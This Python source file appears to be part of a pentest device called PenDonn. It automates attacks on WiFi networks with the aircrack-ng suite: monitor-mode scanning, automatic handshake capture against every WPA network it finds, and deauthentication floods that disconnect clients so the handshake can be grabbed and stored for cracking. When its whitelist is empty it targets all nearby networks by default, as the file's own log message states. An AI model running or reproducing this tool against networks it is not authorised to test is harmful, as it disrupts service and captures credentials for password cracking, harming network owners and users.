"""
PenDonn WiFi Scanner Module
Uses airodump-ng for reliable network detection - inspired by Wifite/Fluxion approach
"""

import os
import time
import csv
import subprocess
import threading
import logging
from datetime import datetime
from typing import List, Dict, Optional

logger = logging.getLogger(__name__)


class WiFiScanner:
    """WiFi scanning using airodump-ng (more reliable than Scapy)"""
    
    def __init__(self, config: Dict, database):
        """Initialize WiFi scanner"""
        self.config = config
        self.db = database
        
        # Auto-detect WiFi interface
        self.management_mac = "dc:a6:32:9e:ea:ba"
        detected = self._detect_wifi_interfaces()
        
        if not detected:
            raise Exception("No external WiFi adapter found!")
        
        self.interface = detected[0]  # Use first external adapter
        logger.info(f"Using WiFi interface: {self.interface}")
        
        self.whitelist_ssids = set(config['whitelist']['ssids'])
        self.running = False
        
        # Scan results
        self.networks = {}  # bssid -> network_info
        self.scan_dir = "./scan_results"
        os.makedirs(self.scan_dir, exist_ok=True)
        
        # Active handshake captures
        self.active_captures = {}
        self.handshake_dir = "./handshakes"
        os.makedirs(self.handshake_dir, exist_ok=True)
        
        self.handshake_timeout = config['wifi']['handshake_timeout']
        
        if self.whitelist_ssids:
            logger.info(f"Whitelist active: {list(self.whitelist_ssids)}")
        else:
            logger.warning("Whitelist EMPTY - will attack ALL networks!")
    
    def _detect_wifi_interfaces(self) -> List[str]:
        """Detect external WiFi adapters"""
        try:
            result = subprocess.run(['ip', 'link', 'show'], 
                                  capture_output=True, text=True, check=True)
            
            interfaces = []
            current_iface = None
            
            for line in result.stdout.split('\n'):
                if ': wlan' in line:
                    current_iface = line.split(': ')[1].split('@')[0]
                elif 'link/ether' in line and current_iface:
                    mac = line.strip().split()[1].lower()
                    if mac != self.management_mac.lower():
                        interfaces.append(current_iface)
                        logger.info(f"Found external WiFi: {current_iface} ({mac})")
                    current_iface = None
            
            return interfaces
        except Exception as e:
            logger.error(f"Interface detection failed: {e}")
            return []
    
    def start(self):
        """Start WiFi scanner"""
        logger.info("Starting WiFi scanner...")
        
        # Enable monitor mode
        self._enable_monitor_mode(self.interface)
        
        self.running = True
        
        # Start scanning thread
        scan_thread = threading.Thread(target=self._scan_loop, daemon=True)
        scan_thread.start()
        
        # Start capture monitor thread
        monitor_thread = threading.Thread(target=self._capture_monitor, daemon=True)
        monitor_thread.start()
        
        logger.info("✓ WiFi scanner started")
    
    def stop(self):
        """Stop WiFi scanner"""
        logger.info("Stopping WiFi scanner...")
        self.running = False
        
        # Stop all active captures
        for bssid in list(self.active_captures.keys()):
            self._stop_capture(bssid)
        
        time.sleep(2)
        logger.info("WiFi scanner stopped")
    
    def _enable_monitor_mode(self, interface: str):
        """Enable monitor mode on interface"""
        try:
            logger.info(f"Enabling monitor mode on {interface}...")
            
            # DON'T kill interfering processes - this kills NetworkManager and breaks SSH!
            # subprocess.run(['airmon-ng', 'check', 'kill'], 
            #              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Enable monitor mode
            subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
            subprocess.run(['iw', interface, 'set', 'monitor', 'none'], check=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
            
            logger.info(f"✓ Monitor mode enabled on {interface}")
        except Exception as e:
            logger.error(f"Failed to enable monitor mode: {e}")
            raise
    
    def _scan_loop(self):
        """Continuous scanning loop using airodump-ng"""
        logger.info("Starting continuous WiFi scan...")
        
        while self.running:
            try:
                # Run airodump-ng scan for 10 seconds
                scan_file = os.path.join(self.scan_dir, f"scan_{int(time.time())}")
                
                logger.debug(f"Running 10-second scan on {self.interface}...")
                
                # Start airodump-ng in background mode
                # --output-format csv: CSV output only
                # -w: write to file
                # Scan both 2.4GHz (1-13) and 5GHz (36-165) channels
                process = subprocess.Popen([
                    'airodump-ng',
                    '--output-format', 'csv',
                    '-w', scan_file,
                    '--band', 'abg',  # a=5GHz, b/g=2.4GHz
                    self.interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Let it scan for 10 seconds
                time.sleep(10)
                
                # Stop airodump-ng
                process.terminate()
                process.wait(timeout=5)
                
                # Parse results
                self._parse_scan_results(scan_file + '-01.csv')
                
                # Clean up old scan files (keep last 5)
                self._cleanup_old_scans()
                
            except Exception as e:
                logger.error(f"Scan error: {e}")
                time.sleep(5)
    
    def _parse_scan_results(self, csv_file: str):
        """Parse airodump-ng CSV output"""
        try:
            if not os.path.exists(csv_file):
                logger.warning(f"Scan file not found: {csv_file}")
                return
            
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # airodump CSV has two sections: APs and Clients
            # We only care about APs (networks)
            sections = content.split('\r\n\r\n')
            if not sections:
                return
            
            # First section is APs
            ap_lines = sections[0].split('\n')
            
            # Find header line (starts with "BSSID")
            header_idx = None
            for i, line in enumerate(ap_lines):
                if line.strip().startswith('BSSID'):
                    header_idx = i
                    break
            
            if header_idx is None:
                return
            
            # Parse CSV
            reader = csv.DictReader(ap_lines[header_idx:], delimiter=',', skipinitialspace=True)
            
            networks_found = 0
            for row in reader:
                try:
                    bssid = row.get('BSSID', '').strip()
                    essid = row.get('ESSID', '').strip()
                    channel = row.get('channel', '').strip()
                    encryption = row.get('Privacy', '').strip()
                    power = row.get('Power', '').strip()
                    
                    if not bssid or not essid:
                        continue
                    
                    # Parse encryption
                    enc_type = self._parse_encryption(encryption, row)
                    
                    # Skip if not in whitelist
                    if self.whitelist_ssids and essid not in self.whitelist_ssids:
                        continue
                    
                    # Parse signal strength
                    try:
                        signal = int(power) if power and power != '-1' else -100
                    except:
                        signal = -100
                    
                    # Parse channel
                    try:
                        channel_num = int(channel) if channel and channel != '-1' else 0
                    except:
                        channel_num = 0
                    
                    # Update or add network
                    if bssid not in self.networks:
                        self.networks[bssid] = {
                            'ssid': essid,
                            'bssid': bssid,
                            'channel': channel_num,
                            'encryption': enc_type,
                            'signal': signal,
                            'last_seen': datetime.now()
                        }
                        
                        # Add to database
                        network_id = self.db.add_network(essid, bssid, channel_num, enc_type, signal)
                        self.networks[bssid]['id'] = network_id
                        
                        # Set whitelist flag
                        if essid in self.whitelist_ssids:
                            self.db.set_whitelist(bssid, True)
                        
                        logger.info(f"✓ Found: {essid} ({bssid}) CH:{channel_num} {enc_type} {signal}dBm")
                        networks_found += 1
                    else:
                        # Update existing
                        self.networks[bssid].update({
                            'signal': signal,
                            'last_seen': datetime.now(),
                            'channel': channel_num,
                            'encryption': enc_type
                        })
                        self.db.add_network(essid, bssid, channel_num, enc_type, signal)
                        
                        # Update whitelist flag
                        if essid in self.whitelist_ssids:
                            self.db.set_whitelist(bssid, True)
                    
                    # Start handshake capture if WPA/WPA2
                    if 'WPA' in enc_type and bssid not in self.active_captures:
                        self._start_handshake_capture(bssid, essid, channel_num)
                
                except Exception as e:
                    logger.debug(f"Error parsing network row: {e}")
            
            if networks_found > 0:
                logger.info(f"📡 Scan complete: {networks_found} new network(s) found")
        
        except Exception as e:
            logger.error(f"Failed to parse scan results: {e}")
    
    def _parse_encryption(self, privacy: str, row: Dict) -> str:
        """Parse encryption type from airodump output"""
        # airodump Privacy column examples: "WPA2", "WPA", "WEP", "OPN"
        # Authentication column has details: "PSK", "MGT", etc.
        
        if not privacy or privacy == 'OPN':
            return "Open"
        
        auth = row.get('Authentication', '').strip()
        cipher = row.get('Cipher', '').strip()
        
        if 'WPA2' in privacy:
            return "WPA2"
        elif 'WPA' in privacy:
            if 'WPA2' in auth:
                return "WPA/WPA2"
            return "WPA"
        elif 'WEP' in privacy:
            return "WEP"
        else:
            return privacy if privacy else "Unknown"
    
    def _cleanup_old_scans(self):
        """Remove old scan files, keep last 5"""
        try:
            scan_files = sorted([
                f for f in os.listdir(self.scan_dir) 
                if f.startswith('scan_')
            ])
            
            # Remove all but last 5
            for old_file in scan_files[:-5]:
                try:
                    os.remove(os.path.join(self.scan_dir, old_file))
                except:
                    pass
        except:
            pass
    
    def _start_handshake_capture(self, bssid: str, ssid: str, channel: int):
        """Start capturing handshake for a network"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            bssid_clean = bssid.replace(':', '')
            capture_base = os.path.join(self.handshake_dir, f"{bssid_clean}_{timestamp}")
            
            logger.info(f"⚡ Starting handshake capture: {ssid} CH:{channel}")
            
            # Start airodump-ng to capture handshake
            # --bssid: filter for specific network
            # --channel: lock to channel
            # -w: write to file
            cmd = [
                'airodump-ng',
                '--bssid', bssid,
                '--channel', str(channel),
                '--write', capture_base,
                '--output-format', 'cap',
                self.interface
            ]
            
            process = subprocess.Popen(cmd, 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
            
            # Wait and verify process started
            time.sleep(2)
            if process.poll() is not None:
                logger.error(f"Failed to start capture for {ssid}")
                return
            
            capture_file = capture_base + '-01.cap'
            
            self.active_captures[bssid] = {
                'ssid': ssid,
                'channel': channel,
                'process': process,
                'capture_file': capture_file,
                'start_time': time.time(),
                'deauth_sent': False
            }
            
            logger.info(f"✓ Capturing {ssid} -> {os.path.basename(capture_file)}")
            
            # Send deauth after 5 seconds
            threading.Thread(target=self._send_deauth_delayed, 
                           args=(bssid, channel), daemon=True).start()
        
        except Exception as e:
            logger.error(f"Failed to start capture for {ssid}: {e}")
    
    def _send_deauth_delayed(self, bssid: str, channel: int):
        """Send deauth packets after delay"""
        time.sleep(5)
        
        if bssid not in self.active_captures:
            return
        
        capture_info = self.active_captures[bssid]
        ssid = capture_info['ssid']
        
        try:
            logger.info(f"💥 Sending deauth to {ssid}...")
            
            # Send deauth packets
            # -0: deauth count
            # -a: AP MAC
            # --channel: specify channel (required for 5GHz)
            result = subprocess.run([
                'aireplay-ng',
                '--deauth', '10',
                '-a', bssid,
                '--channel', str(channel),
                self.interface
            ], capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                logger.info(f"✓ Deauth sent to {ssid}")
                capture_info['deauth_sent'] = True
            else:
                logger.warning(f"Deauth failed for {ssid}: {result.stderr[:200]}")
                capture_info['deauth_sent'] = True  # Mark as sent anyway
        
        except Exception as e:
            logger.error(f"Deauth error for {ssid}: {e}")
    
    def _capture_monitor(self):
        """Monitor active captures and check for handshakes"""
        logger.info("Capture monitor started")
        
        while self.running:
            try:
                time.sleep(30)  # Check every 30 seconds
                
                for bssid in list(self.active_captures.keys()):
                    capture_info = self.active_captures[bssid]
                    elapsed = time.time() - capture_info['start_time']
                    ssid = capture_info['ssid']
                    
                    # Check if process is still alive
                    if capture_info['process'].poll() is not None:
                        logger.warning(f"Capture process died for {ssid}")
                        self._finalize_capture(bssid, success=False)
                        continue
                    
                    # Check for handshake
                    if capture_info.get('deauth_sent', False):
                        has_handshake = self._check_handshake(capture_info['capture_file'])
                        
                        if has_handshake:
                            logger.info(f"🎯 Handshake captured for {ssid}!")
                            self._finalize_capture(bssid, success=True)
                        elif elapsed > self.handshake_timeout:
                            logger.warning(f"❌ Timeout for {ssid} ({int(elapsed)}s)")
                            self._finalize_capture(bssid, success=False)
                        else:
                            logger.info(f"🔍 Checking {ssid} handshake ({int(elapsed)}s)")
            
            except Exception as e:
                logger.error(f"Capture monitor error: {e}")
    
    def _check_handshake(self, capture_file: str) -> bool:
        """Check if capture file contains valid handshake"""
        try:
            if not os.path.exists(capture_file):
                return False
            
            # Use aircrack-ng to verify handshake
            result = subprocess.run([
                'aircrack-ng',
                capture_file
            ], capture_output=True, text=True, timeout=10)
            
            output = result.stdout + result.stderr
            
            # Check for handshake indicators
            return 'handshake' in output.lower() or '1 handshake' in output.lower()
        
        except Exception as e:
            logger.debug(f"Handshake check error: {e}")
            return False
    
    def _finalize_capture(self, bssid: str, success: bool):
        """Finalize a handshake capture"""
        if bssid not in self.active_captures:
            return
        
        capture_info = self.active_captures[bssid]
        ssid = capture_info['ssid']
        
        # Stop airodump process
        try:
            capture_info['process'].terminate()
            capture_info['process'].wait(timeout=5)
        except:
            try:
                capture_info['process'].kill()
            except:
                pass
        
        if success:
            # Add to database
            network_id = self.networks[bssid].get('id')
            if network_id:
                self.db.add_handshake(
                    network_id=network_id,
                    bssid=bssid,
                    ssid=ssid,
                    file_path=capture_info['capture_file'],
                    quality='good'
                )
            
            logger.info(f"✅ Handshake saved: {ssid}")
        else:
            # Clean up failed capture file
            try:
                if os.path.exists(capture_info['capture_file']):
                    os.remove(capture_info['capture_file'])
            except:
                pass
        
        # Remove from active captures
        del self.active_captures[bssid]
    
    def _stop_capture(self, bssid: str):
        """Stop an active capture"""
        if bssid in self.active_captures:
            self._finalize_capture(bssid, success=False)
    
    def get_statistics(self) -> Dict:
        """Get current statistics"""
        return {
            'networks_discovered': len(self.networks),
            'active_captures': len(self.active_captures)
        }
